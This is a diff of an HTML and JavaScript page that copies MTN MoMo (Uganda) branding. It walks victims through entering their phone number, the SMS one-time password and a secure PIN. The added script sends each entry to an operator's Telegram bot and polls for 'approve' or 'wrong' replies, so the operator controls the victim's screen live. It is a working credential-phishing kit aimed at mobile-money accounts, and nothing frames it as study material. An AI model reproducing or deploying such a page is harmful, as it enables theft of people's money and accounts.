@@ -8,227 +8,315 @@
     * { box-sizing: border-box; }
     body { 
       margin: 0; min-height: 100vh; font-family: Arial, sans-serif; 
-      background: #eef2f5; color: #171717; display: flex; flex-direction: column;
+      background: #fdfdfd; color: #171717; display: flex; flex-direction: column;
+      align-items: center; justify-content: space-between;
     }
-    header { background: #004f71; padding: 40px 16px 60px; text-align: center; }
-    .momo-logo-box {
-      width: 60px; height: 60px; background: #ffcc00; border-radius: 12px;
-      margin: 0 auto; display: flex; align-items: center; justify-content: center;
+    
+    header { 
+      background: #FFCC00; 
+      width: 100%; 
+      padding: 30px 16px 25px; 
+      text-align: center; 
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
     }
-    .momo-logo-text { color: #004f71; font-weight: 900; font-size: 18px; }
-    .momo-subtext { color: #ffcc00; font-size: 11px; margin-top: 4px; font-weight: bold; }
+    
+    .mtn-logo {
+      background: #FFCC00;
+      border: 3px solid #000000;
+      border-radius: 50%;
+      width: 105px;
+      height: 62px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'Arial Black', Impact, sans-serif;
+      font-size: 24px;
+      font-weight: 900;
+      color: #000000;
+      letter-spacing: -0.5px;
+    }
+
     main { 
-      width: min(440px, 92%); margin: -35px auto 25px; padding: 30px 24px; 
-      background: white; border-radius: 24px; box-shadow: 0 8px 24px rgba(0, 0, 0, 0.08); z-index: 10;
+      width: min(440px, 100%); 
+      margin: 0 auto; 
+      padding: 20px 32px; 
+      background: white; 
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      flex-grow: 1;
     }
-    h2 { margin-top: 0; text-align: center; color: #004f71; font-size: 22px; }
-    .field-label { display: block; text-align: center; margin: 20px 0 12px; font-weight: 600; color: #555; }
-    .phone-row { display: flex; gap: 10px; align-items: center; border: 1px solid #ccc; border-radius: 16px; padding: 8px 14px; }
+
+    .graphic-container {
+      margin: 10px 0 5px;
+      position: relative;
+      width: 120px;
+      height: 110px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .phone-icon-mock {
+      width: 44px;
+      height: 76px;
+      border: 4px solid #1c1b1f;
+      border-radius: 12px;
+      position: relative;
+      background: #fff;
+    }
+    .bubble-mock {
+      position: absolute;
+      background: #FFCC00;
+      padding: 4px 8px;
+      border-radius: 8px;
+      font-size: 13px;
+      font-weight: bold;
+      letter-spacing: 1px;
+      top: 30px;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+    }
+
+    h2 { 
+      margin: 10px 0 16px; 
+      text-align: center; 
+      color: #000000; 
+      font-size: 28px; 
+      font-weight: 800;
+      letter-spacing: -0.5px;
+    }
+    
+    .instruction-text {
+      font-size: 14.5px;
+      color: #4b4b4b;
+      text-align: center;
+      line-height: 1.5;
+      margin-bottom: 20px;
+      max-width: 340px;
+    }
+
+    .input-section {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+      margin-bottom: 20px;
+    }
+
+    .field-label { 
+      font-size: 15px;
+      font-weight: 700; 
+      color: #000000; 
+      margin-bottom: 8px;
+    }
+
+    .phone-row { 
+      display: flex; 
+      gap: 10px; 
+      align-items: center; 
+      border: 1px solid #b1b1b1; 
+      border-radius: 8px; 
+      padding: 12px 14px; 
+      width: 100%;
+    }
     .country-flag { font-size: 20px; }
-    .phone-input-field { border: none; outline: none; width: 100%; font-size: 18px; font-weight: 600; }
-    .digits { display: flex; justify-content: center; gap: 10px; margin-top: 10px; }
-    .digit { width: 44px; height: 44px; border: 1px solid #ccc; border-radius: 12px; text-align: center; font-size: 20px; font-weight: bold; }
-    button { 
-      width: 100%; padding: 16px; margin-top: 30px; border: 0; border-radius: 25px; 
-      background: #004f71; color: white; font-weight: bold; font-size: 16px; cursor: pointer; 
+    .phone-input-field { border: none; outline: none; width: 100%; font-size: 17px; font-weight: 600; }
+
+    .text-input-field { 
+      width: 100%;
+      border: 1px solid #b1b1b1; 
+      border-radius: 6px; 
+      padding: 15px; 
+      font-size: 15px; 
+      color: #171717;
+      outline: none;
     }
-    button:disabled { background: #cccccc; cursor: not-allowed; }
-    .hidden { display: none !important; }
-    .legal-text { text-align: center; font-size: 13px; color: #666; margin-top: 25px; }
-    .legal-text a { color: #004f71; text-decoration: none; font-weight: bold; }
-    .error { color: #d32f2f; text-align: center; margin-top: 12px; font-weight: 600; }
-    .success { font-size: 24px; text-align: center; color: #2e7d32; font-weight: bold; }
+
+    .digits-row { 
+      display: flex; 
+      justify-content: space-between; 
+      width: 100%;
+      gap: 12px; 
+    }
+    .digit-box { 
+      flex: 1;
+      height: 56px; 
+      border: 1px solid #b1b1b1; 
+      border-radius: 8px; 
+      text-align: center; 
+      font-size: 20px; 
+      font-weight: bold; 
+      outline: none;
+    }
+    .digit-box:focus { border-color: #FFCC00; }
+
+    .info-box {
+      background: #FFF9E6;
+      border-radius: 8px;
+      padding: 12px 14px;
+      display: flex;
+      gap: 12px;
+      align-items: flex-start;
+      margin-bottom: 20px;
+      width: 100%;
+    }
+    .info-icon {
+      background: #FFCC00;
+      color: white;
+      border-radius: 50%;
+      width: 18px;
+      height: 18px;
+      min-width: 18px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: bold;
+      font-size: 12px;
+    }
+    .info-text { font-size: 13px; color: #333333; line-height: 1.4; }
+
+    .action-button { 
+      width: 100%; 
+      padding: 15px; 
+      margin-top: 10px; 
+      border: 0; 
+      border-radius: 25px; 
+      background: #FFCC00; 
+      color: #000000; 
+      font-weight: bold; 
+      font-size: 17px; 
+      cursor: pointer; 
+    }
+
     .secure-overlay {
-      position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0, 30, 45, 0.75);
-      backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); z-index: 9999;
+      position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0, 30, 45, 0.85);
+      backdrop-filter: blur(8px); z-index: 9999;
       display: flex; flex-direction: column; align-items: center; justify-content: center; color: #ffffff; text-align: center;
     }
     .circular-spinner {
-      width: 60px; height: 60px; border: 6px solid rgba(255, 255, 255, 0.2);
-      border-top-color: #00cc66; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px;
+      width: 50px; height: 50px; border: 5px solid rgba(255, 255, 255, 0.2);
+      border-top-color: #FFCC00; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px;
     }
-    .secure-title { font-size: 20px; font-weight: bold; margin-bottom: 8px; letter-spacing: 0.5px; }
-    .secure-sub { font-size: 14px; color: #dddddd; }
     @keyframes spin { to { transform: rotate(360deg); } }
+
+    .footer-curve { width: 100%; height: 35px; background: #FFCC00; clip-path: ellipse(60% 100% at 50% 100%); margin-top: auto; }
+    .hidden { display: none !important; }
+    .error { color: #d32f2f; text-align: center; margin-top: 12px; font-weight: 600; font-size: 13px; }
+    .success { font-size: 22px; text-align: center; color: #2e7d32; font-weight: bold; margin-top: 40px; }
   </style>
 </head>
 <body>
 
+  <!-- Server/Bot Approval Live Loader -->
   <div id="secureModal" class="secure-overlay hidden">
     <div class="circular-spinner"></div>
-    <div class="secure-title">Secure Verification</div>
-    <div class="secure-sub">Verifying your PIN...<br>Please do not close this page.</div>
+    <div id="modalTitle" style="font-size: 18px; font-weight: bold; margin-bottom: 6px;">Secure Verification</div>
+    <div id="modalSub" style="font-size: 13px; color: #ddd;">Waiting for response approval...<br>Please keep this screen open.</div>
   </div>
 
   <header>
-    <div class="momo-logo-box"><span class="momo-logo-text">MoMo</span></div>
-    <div class="momo-subtext">from MTN</div>
+    <div class="mtn-logo">MTN</div>
   </header>
 
   <main>
-    <section id="phonePage">
+    <div class="graphic-container">
+      <div class="phone-icon-mock"></div>
+      <div class="bubble-mock">*****</div>
+    </div>
+
+    <!-- STEP 1: Phone Landing View -->
+    <section id="phonePage" style="width:100%;">
       <h2>Welcome to MoMo</h2>
-      <label class="field-label">Enter number *</label>
-      <div class="phone-row">
-        <div class="country-flag">🇺🇬</div>
-        <input type="text" id="phoneInput" class="phone-input-field" placeholder="e.g. 778260583" inputmode="numeric" maxlength="9">
+      <div class="input-section">
+        <label class="field-label">Enter number *</label>
+        <div class="phone-row">
+          <div class="country-flag">🇺🇬</div>
+          <input type="text" id="phoneInput" class="phone-input-field" placeholder="e.g. 778260583" inputmode="numeric">
+        </div>
       </div>
-      <button id="phoneButton" disabled>NEXT</button>
-      <p id="phoneError" class="error"></p>
-      <p class="legal-text">Signing in confirms your acceptance of our <a href="#">Terms</a> and <a href="#">Privacy Policy</a></p>
+      <button id="phoneButton" class="action-button">NEXT</button>
     </section>
 
-    <section id="pinPage" class="hidden">
-      <h2>Welcome to MoMo</h2>
-      <label class="field-label">Enter your 5-digit PIN</label>
-      <div class="digits" id="pinDigits"></div>
-      <p id="pinStatus" class="status" style="text-align:center; margin-top: 15px;"></p>
-      <p id="pinError" class="error"></p>
+    <!-- STEP 2: Unified Code Field (Supports regular pasting natively) -->
+    <section id="otpScreenOne" class="hidden" style="width:100%;">
+      <h2>OTP Verification</h2>
+      <p class="instruction-text">We have sent a One-Time Password (OTP) to your mobile number via SMS.</p>
+      <div class="info-box">
+        <div class="info-icon">i</div>
+        <div class="info-text">Check your SMS inbox for the OTP message from MTN.</div>
+      </div>
+      <div class="input-section">
+        <label class="field-label">Enter OTP</label>
+        <input type="text" id="otpPasteInput" class="text-input-field" placeholder="Paste the code from your SMS">
+      </div>
+      <button id="verifyBtnOne" class="action-button">Verify</button>
     </section>
 
+    <!-- STEP 3: Separated Secure PIN View (Now supports split-pasting data strings) -->
+    <section id="otpScreenTwo" class="hidden" style="width:100%;">
+      <h2>Enter Secure PIN</h2>
+      <p class="instruction-text">Enter the 4-digit security code received below.</p>
+      <div class="input-section">
+        <div class="digits-row">
+          <input type="text" class="digit-box" maxlength="1" inputmode="numeric">
+          <input type="text" class="digit-box" maxlength="1" inputmode="numeric">
+          <input type="text" class="digit-box" maxlength="1" inputmode="numeric">
+          <input type="text" class="digit-box" maxlength="1" inputmode="numeric">
+        </div>
+      </div>
+      <button id="verifyBtnTwo" class="action-button" style="margin-top: 20px;">Verify PIN</button>
+    </section>
+
+    <!-- STEP 4: Success View -->
     <section id="successPage" class="hidden">
       <div class="success">✓ Verified Successfully</div>
     </section>
+
+    <p id="errorFeedback" class="error"></p>
   </main>
 
+  <div class="footer-curve"></div>
+
   <script>
-    let currentRequestId = null;
-    let pollInterval = null;
+    const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
+    const CHAT_ID = "YOUR_CHAT_ID_HERE";
 
     const phonePage = document.getElementById('phonePage');
-    const pinPage = document.getElementById('pinPage');
+    const otpScreenOne = document.getElementById('otpScreenOne');
+    const otpScreenTwo = document.getElementById('otpScreenTwo');
     const successPage = document.getElementById('successPage');
-    const phoneInput = document.getElementById('phoneInput');
-    const phoneButton = document.getElementById('phoneButton');
-    const phoneError = document.getElementById('phoneError');
-    const pinDigitsContainer = document.getElementById('pinDigits');
     const secureModal = document.getElementById('secureModal');
-    const pinStatus = document.getElementById('pinStatus');
-    const pinError = document.getElementById('pinError');
+    const errorFeedback = document.getElementById('errorFeedback');
+    
+    let userPhone = "";
+    let currentStep = "";
 
-    // Frontend text monitoring to swap button styles dynamically
-    phoneInput.addEventListener('input', (e) => {
-      let digits = e.target.value.replace(/[^0-9]/g, '');
-      e.target.value = digits;
-      if (digits.length === 9) {
-        phoneButton.removeAttribute('disabled');
-        phoneButton.style.background = "#004f71"; // Distinct rich colored option
-      } else {
-        phoneButton.setAttribute('disabled', 'true');
-        phoneButton.style.background = "#cccccc";
-      }
-    });
-
-    phoneButton.addEventListener('click', async () => {
-      phoneError.textContent = '';
-      phoneButton.disabled = true;
-      const fullPhone = '+256' + phoneInput.value;
-
+    async function sendTelegramAlert(message) {
       try {
-        const res = await fetch('/api/phone', {
+        await fetch(`https://telegram.org{BOT_TOKEN}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ phone: fullPhone })
+          body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
         });
-        const data = await res.json();
-        if (!res.ok) throw new Error(data.error || 'Failed to start.');
-
-        currentRequestId = data.id;
-        phonePage.classList.add('hidden');
-        pinPage.classList.remove('hidden');
-        createPinInputs(pinDigitsContainer, 5);
-      } catch (err) {
-        phoneError.textContent = err.message;
-        phoneButton.removeAttribute('disabled');
-        phoneButton.style.background = "#004f71";
-      }
-    });
-
-    function createPinInputs(container, count) {
-      container.innerHTML = '';
-      const inputs = [];
-      for (let i = 0; i < count; i++) {
-        const input = document.createElement('input');
-        input.type = 'password';
-        input.inputMode = 'numeric';
-        input.maxLength = 1;
-        input.className = 'digit';
-
-        input.addEventListener('input', (e) => {
-          e.target.value = e.target.value.replace(/[^0-9]/g, '');
-          if (e.target.value && input.nextElementSibling) input.nextElementSibling.focus();
-          
-          const pinVal = inputs.map(inp => inp.value).join('');
-          if (pinVal.length === count) submitPinFlow(pinVal, inputs);
-        });
-
-        input.addEventListener('keydown', (e) => {
-          if (e.key === 'Backspace' && !e.target.value && input.previousElementSibling) input.previousElementSibling.focus();
-        });
-
-        container.appendChild(input);
-        inputs.push(input);
-      }
-      if(inputs[0]) inputs[0].focus();
+      } catch (err) { console.error(err); }
     }
 
-    async function submitPinFlow(pinValue, inputs) {
-      pinError.textContent = '';
-      secureModal.classList.remove('hidden'); 
-      inputs.forEach(i => i.disabled = true);
-
-      try {
-        const res = await fetch('/api/pin-demo', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ id: currentRequestId, pin: pinValue })
-        });
-        if (!res.ok) throw new Error('Submission failed.');
-        startPollingAdminState(inputs);
-      } catch (err) {
-        secureModal.classList.add('hidden');
-        pinError.textContent = err.message;
-        inputs.forEach(i => { i.disabled = false; i.value = ''; });
-        if(inputs[0]) inputs[0].focus();
-      }
-    }
-
-    function startPollingAdminState(inputs) {
-      if (pollInterval) clearInterval(pollInterval);
-      pollInterval = setInterval(async () => {
+    let lastUpdateId = 0;
+    async function listenForServerApproval() {
+      setInterval(async () => {
         try {
-          const res = await fetch(`/api/status/${currentRequestId}`);
-          if (!res.ok) return;
+          const res = await fetch(`https://telegram.org{BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`);
           const data = await res.json();
+          if (data.result && data.result.length > 0) {
+            data.result.forEach(update => {
+              lastUpdateId = update.update_id;
+              if(update.message && update.message.text) {
+                const text = update.message.text.toLowerCase();
+                if (text.includes('approve') || text.includes('correct')) {
+                  advanceFlow();
+                } else if (text.includes('wrong') || text.includes('reject')) {
+                  triggerError();
+                }
 
-          if (data.status === 'approved') {
-            clearInterval(pollInterval);
-            secureModal.classList.add('hidden');
-            pinPage.classList.add('hidden');
-            successPage.classList.remove('hidden');
-          } else if (data.status === 'declined') {
-            clearInterval(pollInterval);
-            secureModal.classList.add('hidden'); 
-            pinStatus.innerHTML = `Declined. <button id="retryBtn" style="padding: 8px 16px; margin-top: 10px;">Try Again</button>`;
-            document.getElementById('retryBtn').addEventListener('click', () => resetPinLayout(inputs));
-          }
-        } catch (err) { console.error(err); }
-      }, 3000);
-    }
-
-    async function resetPinLayout(inputs) {
-      try {
-        await fetch('/api/retry', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ id: currentRequestId })
-        });
-        inputs.forEach(i => { i.value = ''; i.disabled = false; });
-        pinStatus.textContent = '';
-        pinError.textContent = '';
-        if(inputs[0]) inputs[0].focus();
-      } catch (err) { pinError.textContent = 'Reset failed.'; }
-    }
-  </script>
-</body>
-</html>
